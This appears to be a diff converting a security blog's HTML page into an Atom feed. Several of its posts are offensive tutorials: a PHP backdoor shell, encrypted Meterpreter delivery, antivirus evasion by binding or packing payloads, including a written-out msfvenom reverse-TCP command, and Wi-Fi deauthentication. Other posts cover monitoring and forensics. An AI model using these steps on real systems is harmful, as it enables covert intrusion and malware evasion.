@@ -1,102 +1,24 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
 
-<!DOCTYPE html>
-<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
-<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
-<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
-<head>
-  <meta charset="utf-8">
-  <title>Iris Security Labs Blog</title>
-  <meta name="author" content="Iris Security Labs">
-
-  
-  <meta name="description" content="Recently I&rsquo;ve been finding the need more and more to have a reliable backdoor PHP shell that has a reputable history. From work experience I &hellip;">
-  
-
-  <!-- http://t.co/dKP3o1e -->
-  <meta name="HandheldFriendly" content="True">
-  <meta name="MobileOptimized" content="320">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  
-  <link rel="canonical" href="http://blog.irissecuritylabs.com/">
-  <link href="/favicon.png" rel="icon">
-  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
-  <link href="/atom.xml" rel="alternate" title="Iris Security Labs Blog" type="application/atom+xml">
-  <script src="/javascripts/modernizr-2.0.js"></script>
-  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
-  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
-  <script src="/javascripts/octopress.js" type="text/javascript"></script>
-  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
-<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
-<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
-
-  
-  <script type="text/javascript">
-    var _gaq = _gaq || [];
-    _gaq.push(['_setAccount', 'UA-72521344-1']);
-    _gaq.push(['_trackPageview']);
-
-    (function() {
-      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
-      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
-      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
-    })();
-  </script>
-
-
-</head>
-
-<body   >
-  <header role="banner"><hgroup>
-  <img src="../../images/logo.png" style="width:40%;height:40%;">
-</hgroup>
-
-</header>
-  <nav role="navigation"><ul class="subscription" data-subscription="rss">
-  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
-  
-</ul>
-  
-<form action="https://www.google.com/search" method="get">
-  <fieldset role="search">
-    <input type="hidden" name="sitesearch" value="blog.irissecuritylabs.com">
-    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
-  </fieldset>
-</form>
-  
-<ul class="main-navigation">
-  <li><a href="/">Blog</a></li>
-  <li><a href="/blog/archives">Archives</a></li>
-</ul>
-
-</nav>
-  <div id="main">
-    <div id="content">
-      <div class="blog-index">
-  
-  
-  
-    <article>
-      
-  <header>
+  <title><![CDATA[Iris Security Labs Blog]]></title>
+  <link href="http://blog.irissecuritylabs.com/atom.xml" rel="self"/>
+  <link href="http://blog.irissecuritylabs.com/"/>
+  <updated>2016-01-19T12:19:09-05:00</updated>
+  <id>http://blog.irissecuritylabs.com/</id>
+  <author>
+    <name><![CDATA[Iris Security Labs]]></name>
     
-      <h1 class="entry-title"><a href="/blog/2015/02/27/custom-php-backdoor-shell-with-weevely/">Custom PHP Backdoor Shell With Weevely</a></h1>
-    
-    
-      <p class="meta">
-        
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
 
-
-
-
-<time class='entry-date' datetime='2015-02-27T14:45:07-05:00'><span class='date'><span class='date-month'>Feb</span> <span class='date-day'>27</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:45 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Recently I&rsquo;ve been finding the need more and more to have a reliable backdoor PHP shell that has a reputable history. From work experience I knew about the classic c99.php backdoor shell and knew that it wasn&rsquo;t the direction I wanted to go in. If you haven&rsquo;t read The Hacker Blog article on it <a href="http://thehackerblog.com/every-c99-php-shell-is-backdoored-aka-free-shells/">here</a>, it&rsquo;s definitely worth a read.</p>
+  
+  <entry>
+    <title type="html"><![CDATA[Custom PHP Backdoor Shell With Weevely]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2015/02/27/custom-php-backdoor-shell-with-weevely/"/>
+    <updated>2015-02-27T14:45:07-05:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2015/02/27/custom-php-backdoor-shell-with-weevely</id>
+    <content type="html"><![CDATA[<p>Recently I&rsquo;ve been finding the need more and more to have a reliable backdoor PHP shell that has a reputable history. From work experience I knew about the classic c99.php backdoor shell and knew that it wasn&rsquo;t the direction I wanted to go in. If you haven&rsquo;t read The Hacker Blog article on it <a href="http://thehackerblog.com/every-c99-php-shell-is-backdoored-aka-free-shells/">here</a>, it&rsquo;s definitely worth a read.</p>
 
 <p>So I came across Weevely. What an awesome little backdoor! Here I&rsquo;m just going to walk through the basic usage of it to get you up and running. This backdoor is definitely the quick and easy way of doing things when pentesting a PHP site.</p>
 
@@ -112,35 +34,15 @@
          <img src="../../images/weevely4.png" alt="weevely4" /></p></li>
 </ol>
 
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/07/01/meterpreter-over-ssl-with-maligno/">Meterpreter Over SSL With Maligno</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-07-01T22:20:17-04:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>1</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>10:20 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Certain situations require meterpreter sessions to be encrypted to avoid layer 4 detection. This is something I&rsquo;ve desired in the past but never really pursued, until I came across Maligno. Maligno is a platform from which you can launch metasploit payloads via https that are AES encrypted and base64 encoded. The payload to be pushed to the client can also be be encoded numerous times via any Metasploit encoders to avoid layer 7 detection.</p>
+  <entry>
+    <title type="html"><![CDATA[Meterpreter Over SSL With Maligno]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2014/07/01/meterpreter-over-ssl-with-maligno/"/>
+    <updated>2014-07-01T22:20:17-04:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2014/07/01/meterpreter-over-ssl-with-maligno</id>
+    <content type="html"><![CDATA[<p>Certain situations require meterpreter sessions to be encrypted to avoid layer 4 detection. This is something I&rsquo;ve desired in the past but never really pursued, until I came across Maligno. Maligno is a platform from which you can launch metasploit payloads via https that are AES encrypted and base64 encoded. The payload to be pushed to the client can also be be encoded numerous times via any Metasploit encoders to avoid layer 7 detection.</p>
 
 <p>This is the process of setting up your server:</p>
 
@@ -182,35 +84,15 @@
     <img src="../../images/maligno-vtresults.png" alt="maligno-vtresults" /></p></li>
 </ol>
 
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/01/21/anonymous-content-grabbing-with-python/">Anonymous Content Grabbing With Python</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-01-21T21:15:36-05:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>9:15 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><img src="../../images/Anonymity.png" alt="Anonymity" /></p>
+  <entry>
+    <title type="html"><![CDATA[Anonymous Content Grabbing With Python]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2014/01/21/anonymous-content-grabbing-with-python/"/>
+    <updated>2014-01-21T21:15:36-05:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2014/01/21/anonymous-content-grabbing-with-python</id>
+    <content type="html"><![CDATA[<p><img src="../../images/Anonymity.png" alt="Anonymity" /></p>
 
 <p>As a malware analyst, sometimes it&rsquo;s necessary to obtain a sample of a website&rsquo;s source code to manually evaluate any hidden malicious JavaScript. But why give up your IP address and possibly your exact whereabouts just to snoop around?</p>
 
@@ -219,35 +101,15 @@
 <p>Nothing special, just a quick and dirty little terminal program that pulls a random proxy, emulates a random browser and pulls the specified content using it&rsquo;s forged identity. Written so that it&rsquo;s easy to understand and easy to customize should you like to make changes to it.</p>
 
 <p>Usage: ./anonBrowser.py -s URL</p>
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/01/21/granular-network-security-monitoring-with-bro-ids/">Granular Network Security Monitoring With Bro IDS</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-01-21T21:14:09-05:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2014</span></span> <span class='time'>9:14 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><img src="../../images/Onion.png" alt="Onion" /></p>
+  <entry>
+    <title type="html"><![CDATA[Granular Network Security Monitoring With Bro IDS]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2014/01/21/granular-network-security-monitoring-with-bro-ids/"/>
+    <updated>2014-01-21T21:14:09-05:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2014/01/21/granular-network-security-monitoring-with-bro-ids</id>
+    <content type="html"><![CDATA[<p><img src="../../images/Onion.png" alt="Onion" /></p>
 
 <p>If you&rsquo;re a security researcher and haven&rsquo;t kicked the wheels yet of Doug Burks' <a href="https://code.google.com/p/security-onion/">Security Onion</a>, you&rsquo;re missing out on a enormous asset to your security arsenal. The Onion provides complete insight into your network providing you with a full IDS (Intrusion Detection System) and NSM (Network Security Monitoring) capabilities.</p>
 
@@ -278,35 +140,15 @@
 55 23 * * * /opt/URLchecker/CountryCodeChecker.sh | /usr/sbin/ssmtp example@gmail.com</code></p></li>
 </ol>
 
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2013/11/11/cryptolocker-analysis-with-volatility/">Cryptolocker Analysis With Volatility</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2013-11-11T19:15:32-05:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>7:15 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>There&rsquo;s been a lot of hype recently about the new cryptolocker virus going around. Lucky me, I got a copy of it. Ths write-up documents what I found. Upon opening a malicious email sent to the user, <code>7879.tmp.exe</code> made it&rsquo;s way onto the system. This executable spawned two more processes, <code>bcfitawu.exe</code> and <code>Kgvndlyklezfbnr.exe</code>. A full memory dump was acquired using mandiant&rsquo;s tool Redline. A quick run through in Malwr and anubis prouced the following results:</p>
+  <entry>
+    <title type="html"><![CDATA[Cryptolocker Analysis With Volatility]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2013/11/11/cryptolocker-analysis-with-volatility/"/>
+    <updated>2013-11-11T19:15:32-05:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2013/11/11/cryptolocker-analysis-with-volatility</id>
+    <content type="html"><![CDATA[<p>There&rsquo;s been a lot of hype recently about the new cryptolocker virus going around. Lucky me, I got a copy of it. Ths write-up documents what I found. Upon opening a malicious email sent to the user, <code>7879.tmp.exe</code> made it&rsquo;s way onto the system. This executable spawned two more processes, <code>bcfitawu.exe</code> and <code>Kgvndlyklezfbnr.exe</code>. A full memory dump was acquired using mandiant&rsquo;s tool Redline. A quick run through in Malwr and anubis prouced the following results:</p>
 
 <p><code>7879.tmp.exe</code>:
 <a href="https://malwr.com/analysis/Y2UxODQyOWY2ZjljNDk3NDg0M2FhYzkyN2EyZmU4ZWI/">Malwr Results</a>
@@ -351,35 +193,15 @@
     <img src="../../images/IPreputation.png" alt="IPReputation" /></p></li>
 </ol>
 
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2013/03/18/rsyslog-vs-syslog-ng/">Rsyslog vs Syslog-ng</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2013-03-18T16:30:51-04:00'><span class='date'><span class='date-month'>Mar</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>4:30 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Ever tried to set-up a central server to manage all of you log aggregation? This post covers my exploration of two key components of just about any centralized logging server.</p>
+  <entry>
+    <title type="html"><![CDATA[Rsyslog vs Syslog-ng]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2013/03/18/rsyslog-vs-syslog-ng/"/>
+    <updated>2013-03-18T16:30:51-04:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2013/03/18/rsyslog-vs-syslog-ng</id>
+    <content type="html"><![CDATA[<p>Ever tried to set-up a central server to manage all of you log aggregation? This post covers my exploration of two key components of just about any centralized logging server.</p>
 
 <p>If you&rsquo;re thinking about setting up remote logging, you will undoubtedly be needing either syslog-ng or rsyslog.
 If you&rsquo;ve never had to deal with either of these,it can be a daunting task. So which is better you ask? Well that depends on the level of granularity you&rsquo;re looking for.</p>
@@ -428,35 +250,15 @@ log {source(firewall); destination(firewall); };</code></p>
 <p>Look familiar?</p>
 
 <p>Thanks for reading.</p>
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2013/01/07/reset-windows-passwords-using-backtrack/">Reset Windows Passwords Using Backtrack</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2013-01-07T08:16:42-05:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>8:16 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>This is just a quick and dirty write-up on resetting a &ldquo;forgotten&rdquo; windows password using Linux. Backtrack specifically.</p>
+  <entry>
+    <title type="html"><![CDATA[Reset Windows Passwords Using Backtrack]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2013/01/07/reset-windows-passwords-using-backtrack/"/>
+    <updated>2013-01-07T08:16:42-05:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2013/01/07/reset-windows-passwords-using-backtrack</id>
+    <content type="html"><![CDATA[<p>This is just a quick and dirty write-up on resetting a &ldquo;forgotten&rdquo; windows password using Linux. Backtrack specifically.</p>
 
 <p>To use this method, we will be using a Backtrack live usb drive. Once you&rsquo;ve downloaded the Backtrack iso and loaded it onto the usb drive (I prefer using unetbootin for this) we&rsquo;re ready to get started.</p>
 
@@ -493,35 +295,15 @@ log {source(firewall); destination(firewall); };</code></p>
 <p>Now enter ! to quit the editor and q to leave chntpw. Make sure you specify yes to write to the newly editted hives.</p>
 
 <p>You should now be able to boot into windows and login without a user password.</p>
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2012/12/31/google-hacks-find-anything-you-want/">Google Hacks - Find Anything You Want</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-12-31T21:40:14-05:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>31</span><span class='date-suffix'>st</span>, <span class='date-year'>2012</span></span> <span class='time'>9:40 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><img src="../../images/google_hack.jpg" alt="Google hack" /></p>
+  <entry>
+    <title type="html"><![CDATA[Google Hacks - Find Anything You Want]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2012/12/31/google-hacks-find-anything-you-want/"/>
+    <updated>2012-12-31T21:40:14-05:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2012/12/31/google-hacks-find-anything-you-want</id>
+    <content type="html"><![CDATA[<p><img src="../../images/google_hack.jpg" alt="Google hack" /></p>
 
 <p>Google being the omnipotent entity that it is, provides us with an unlimited wealth of knowledge at our finger tips. Literally anything you could possibly want to know about can be found with the ease of a click. This is pretty well known.</p>
 
@@ -545,35 +327,15 @@ Lets examine this search string:</p>
 <p><code>?intitle:index.of?mp3 Aerosmith</code></p>
 
 <p>This will search any unsecured directory put online containing only mp3s of the band Aerosmith. This same string can be manipulated to look for pdfs for osint, or whichever file type you have in mind.</p>
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2012/12/13/bypass-antivirus-with-shikata-ga-nai-encoder/">Bypass Antivirus With Shikata Ga Nai Encoder</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-12-13T11:03:33-05:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2012</span></span> <span class='time'>11:03 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Using metasploit, it is possible to combine a meterpreter session with a completely benign executable. That way when a user executes the innocent looking executable, a meterpreter session is opened to a remote machine essentially giving it identical level access to the exploited machine as the user running the binary. ESET&rsquo;s NOD32 in this example will still detect the malicious executable and try to delete it, but a connection will have already been made to the compromised system.</p>
+  <entry>
+    <title type="html"><![CDATA[Bypass Antivirus With Shikata Ga Nai Encoder]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2012/12/13/bypass-antivirus-with-shikata-ga-nai-encoder/"/>
+    <updated>2012-12-13T11:03:33-05:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2012/12/13/bypass-antivirus-with-shikata-ga-nai-encoder</id>
+    <content type="html"><![CDATA[<p>Using metasploit, it is possible to combine a meterpreter session with a completely benign executable. That way when a user executes the innocent looking executable, a meterpreter session is opened to a remote machine essentially giving it identical level access to the exploited machine as the user running the binary. ESET&rsquo;s NOD32 in this example will still detect the malicious executable and try to delete it, but a connection will have already been made to the compromised system.</p>
 
 <ol>
 <li><p>Choose a template executable, utorrent for example, and download it to the desktop.</p></li>
@@ -611,35 +373,15 @@ Lets examine this search string:</p>
 <p><img src="../../images/Exploited_system.png" alt="Exploited_system" /></p>
 
 <p>And that&rsquo;s about it, even after AV detects your executable and deletes it, you&rsquo;re already in. Thanks for reading.</p>
-</div>
+]]></content>
+  </entry>
   
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2012/12/02/disassociation-packets/">Evil Twin Attack: Disassociation Packets</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2012-12-02T13:03:36-05:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>2</span><span class='date-suffix'>nd</span>, <span class='date-year'>2012</span></span> <span class='time'>1:03 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Evil Twin Attack: An attack in which the attacker deauthenticates clients from an access point (AP) then takes it down and puts up a fake AP with an identical SSID to that of the original to intercept and monitor all traffic as a man in the middle.</p>
+  <entry>
+    <title type="html"><![CDATA[Evil Twin Attack: Disassociation Packets]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2012/12/02/disassociation-packets/"/>
+    <updated>2012-12-02T13:03:36-05:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2012/12/02/disassociation-packets</id>
+    <content type="html"><![CDATA[<p>Evil Twin Attack: An attack in which the attacker deauthenticates clients from an access point (AP) then takes it down and puts up a fake AP with an identical SSID to that of the original to intercept and monitor all traffic as a man in the middle.</p>
 
 <p>In this portion of the attack I will mainly be focusing on the deauthentication packets or disassociation frames. The purpose of these deauthentication packets is to knock all the clients off of a wireless network before having them reconnect to the fake AP.</p>
 
@@ -680,124 +422,93 @@ Lets examine this search string:</p>
 <p><a href="../../images/131450_560x148_scrot.png"><img src="images/131450_560x148_scrot.png" alt="Disassociated client" /></a></p>
 
 <p>As for the rest of the Evil Twin Attack, it will be covered in another post.</p>
-</div>
+]]></content>
+  </entry>
   
+  <entry>
+    <title type="html"><![CDATA[Simple but Effective - Hyperion PE-cryptor]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2012/11/13/simple-but-effective-hyperion-pe-cryptor/"/>
+    <updated>2012-11-13T15:53:49-05:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2012/11/13/simple-but-effective-hyperion-pe-cryptor</id>
+    <content type="html"><![CDATA[<p>Recently I&rsquo;ve been indulging my interest in metasploit again and found the need to bypass Microsoft Security Essentials AV detection. I had done this before using executable binding and payload encryption using the shikata ga nai encrypter, but decided to see if I couldn&rsquo;t go about things in a different possibly easier fashion. So here is how I went about doing it.</p>
+
+<p>First I downloaded the Hyperion PE-cryptor (packer and encryptor) to my home directory and unzipped it:</p>
+
+<p><code>wget http://nullsecurity.net/tools/binary/Hyperion-1.0.zip</code></p>
+
+<p><code>unzip Hyperion-1.0.zip</code></p>
+
+<p>Next I changed directories into my newly created Hyperion-1.0/ directory and created my crypter with which I could pack and encode my payload:</p>
+
+<p><code>cd Hyperion-1.0/</code></p>
+
+<p><code>sudo wine /root/.wine/drive_c/MinGW/bin/g++.exe ./Src/Crypter/*.cpp -o crypter.exe</code></p>
+
+<p>Now that I had my PE-crypter ready, it was time to create my payload that I wanted to be delivered to my target system. This payload was set to establish a reverse tcp connection back to my host machine over port 4444 at 192.168.1.2:</p>
+
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe &gt;payload.exe</code></p>
+
+<p>Last but not least, I added the secret sauce to my payload by packing and encrypting it with the crypter using wine and gave it a new name:</p>
+
+<p><code>sudo wine crypter.exe payload.exe pwned.exe</code></p>
+
+<p>All that was left to do now was to create a reverse tcp handler in mfsconsole and wait for the payload to connect back to my host machine.</p>
+
+<p><img src="../../images/reverse_tcp.png" alt="reverse tcp handler" /></p>
+
+<p>Special thanks to E-Spohn for his <a href="http://e-spohn.com/blog/2012/08/02/pe-crypters-hyperion/">write up</a></p>
+]]></content>
+  </entry>
   
+  <entry>
+    <title type="html"><![CDATA[Data Retrieval on a Failing Hard Drive]]></title>
+    <link href="http://blog.irissecuritylabs.com/blog/2012/10/28/data-retrieval-on-a-failing-hard-drive/"/>
+    <updated>2012-10-28T22:10:21-04:00</updated>
+    <id>http://blog.irissecuritylabs.com/blog/2012/10/28/data-retrieval-on-a-failing-hard-drive</id>
+    <content type="html"><![CDATA[<p>If you&rsquo;ve ever manually imaged a hardrive before, you understand that it should be a simple task; mount the hard drive with an IDE or SATA to USB connector and pull off the data. Unfortunately, this is not always the case. When a hard drive has failed the Diagnostic Fitness Test and is most likely already well on it&rsquo;s way out. When this is the case, we&rsquo;re sometimes forced to use some unconventional linux tools to do the job. Here is how I did it.</p>
 
+<ol>
+<li><p>I decided the best approach would be to take a digital image of the hard drive so that no more data loss would occur due to the failing sectors on the hard drive. Basically salvage what you can. This is a rather simple procedure with a linux tool called dd. Once you have the hard drive connected to the computer with the IDE or SATA to USB connector, open the terminal and enter:</p>
 
-    </article>
+<p><code>sudo fdisk -l</code></p>
+
+<p><img src="../../images/fDisk.png" alt="Fdisk example" /></p>
+
+<p>This gives you a list of all the storage devices connected to the computer.</p>
+
+<p>The next step would be to unmount the hard drive (assuming linux had mounted it automatically) using the commands:</p>
+
+<p><code>sudo umount /dev/sdb1</code></p>
+
+<p> Make sure you specify the correct device, normally something along the lines of sdb1 or sdc1 depending on the amount of devices plugged into your computer.</p></li>
+<li><p>To initiate the image copying process, we use the commands:</p>
+
+<p><code>sudo dd if=/dev/sdb1 of=/mnt/image.dd conv=sync,noerror</code></p>
+
+<p>This creates a bit for bit clone of the hard drive with an &ldquo;input file&rdquo; of /dev/sdb1 and an &ldquo;output file&rdquo; of /mnt/image.dd. The conv=sync,noerror portion of the command just tells dd that if it comes across a sector of the hard drive that it cannot read that it should over write these bad sectors with zeros thereby not crashing the copying process.</p></li>
+<li><p>Congratulations you&rsquo;re done! Kind of&hellip;
+If everything goes smoothly, you should now be able to mount the image just as if it were a normal hard drive with the commands:</p>
+
+<p>   <code>sudo mkdir /mnt/external
+   sudo mount -t ntfs -o loop /mnt/image.dd /mnt/external</code></p></li>
+<li><p>But wait there&rsquo;s more! Occasionally dd does not work and it requires us to do some additional work, this my perticular scenario. After spending some time researching restoring data from failing hard drives, I came across the terminal tool called ddrescue.</p>
+
+<p>To install ddrescue on a debian distro use the apt-get command:</p>
+
+<p><code>sudo apt-get install gddrescue</code></p>
+
+<p>Luckily the syntax for ddrescue is very similar to that of dd&rsquo;s. To take an image of the mounted hard drive run the command:</p>
+
+<p><code>sudo ddrescue /dev/sdb1 /mnt/image.dd</code></p>
+
+<p><img src="../../images/ddRescue.png" alt="ddrescue" /></p>
+
+<p>What really makes ddrescue such a powerful tool is how aggressive it is in it&rsquo;s copying process. It will read crashed partitions and over write them with zeros even where it&rsquo;s counterpart tools fail.</p>
+
+<p>After the copying process has finished, the image should now be mountable and data can be extracted.</p></li>
+</ol>
+
+]]></content>
+  </entry>
   
-  <div class="pagination">
-    
-      <a class="prev" href="/posts/2">&larr; Older</a>
-    
-    <a href="/blog/archives">Blog Archives</a>
-    
-  </div>
-</div>
-<aside class="sidebar">
-  
-    <section>
-  <h1>Recent Posts</h1>
-  <ul id="recent_posts">
-    
-      <li class="post">
-        <a href="/blog/2015/02/27/custom-php-backdoor-shell-with-weevely/">Custom PHP Backdoor Shell With Weevely</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2014/07/01/meterpreter-over-ssl-with-maligno/">Meterpreter Over SSL With Maligno</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2014/01/21/anonymous-content-grabbing-with-python/">Anonymous Content Grabbing With Python</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2014/01/21/granular-network-security-monitoring-with-bro-ids/">Granular Network Security Monitoring With Bro IDS</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2013/11/11/cryptolocker-analysis-with-volatility/">Cryptolocker Analysis With Volatility</a>
-      </li>
-    
-  </ul>
-</section>
-
-<section>
-  <h1>GitHub Repos</h1>
-  <ul id="gh_repos">
-    <li class="loading">Status updating...</li>
-  </ul>
-  
-  <a href="https://github.com/irissecuritylabs">@irissecuritylabs</a> on GitHub
-  
-  <script type="text/javascript">
-    $(document).ready(function(){
-        if (!window.jXHR){
-            var jxhr = document.createElement('script');
-            jxhr.type = 'text/javascript';
-            jxhr.src = '/javascripts/libs/jXHR.js';
-            var s = document.getElementsByTagName('script')[0];
-            s.parentNode.insertBefore(jxhr, s);
-        }
-
-        github.showRepos({
-            user: 'irissecuritylabs',
-            count: 0,
-            skip_forks: true,
-            target: '#gh_repos'
-        });
-    });
-  </script>
-  <script src="/javascripts/github.js" type="text/javascript"> </script>
-</section>
-
-
-
-
-
-  
-</aside>
-
-    </div>
-  </div>
-  <footer role="contentinfo"><p>
-  Copyright &copy; 2016 - Iris Security Labs -
-  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
-</p>
-
-</footer>
-  
-
-
-
-<div id="fb-root"></div>
-<script>(function(d, s, id) {
-  var js, fjs = d.getElementsByTagName(s)[0];
-  if (d.getElementById(id)) {return;}
-  js = d.createElement(s); js.id = id; js.async = true;
-  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
-  fjs.parentNode.insertBefore(js, fjs);
-}(document, 'script', 'facebook-jssdk'));</script>
-
-
-
-
-
-  <script type="text/javascript">
-    (function(){
-      var twitterWidgets = document.createElement('script');
-      twitterWidgets.type = 'text/javascript';
-      twitterWidgets.async = true;
-      twitterWidgets.src = '//platform.twitter.com/widgets.js';
-      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
-    })();
-  </script>
-
-
-
-
-
-</body>
-</html>
+</feed>
